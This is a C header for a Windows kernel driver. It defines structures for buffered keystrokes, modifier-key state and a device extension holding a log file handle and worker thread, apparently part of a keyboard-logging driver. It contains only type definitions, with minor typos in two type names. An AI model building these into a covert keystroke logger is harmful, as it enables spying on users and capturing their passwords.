#ifndef _COMMON_H
#define _COMMON_H
#include <winddk.h>

typedef struct _KEY_DATA
{
	LIST_ENTRY ListEntry;
	char KeyData;
	char KeyFlags;
}KEY_DATA, PKEY_DATA;

typedef struct _KEY_STATE{
	BOOL kSHIFT; //if the shift key is pressed 
	BOOL kCAPSLOCK; //if the caps lock key is pressed down
	BOOL kCTRL; //if the control key is pressed down
	BOOL kALT; //if the alt key is pressed down
}KEY_STATE, *PKEY_STATE;

typedef struct _DEVICE_EXTENSION{
	HANDLE hFile;
	bool bThreadTerminate;
	PETHREAD pThreadObj;
	PRKSEMAPHORE sem;
	LIST_ENTRY MessageList;
}DEVICE_EXTENSION, *PDEVICE_EXTIONSION;

#endif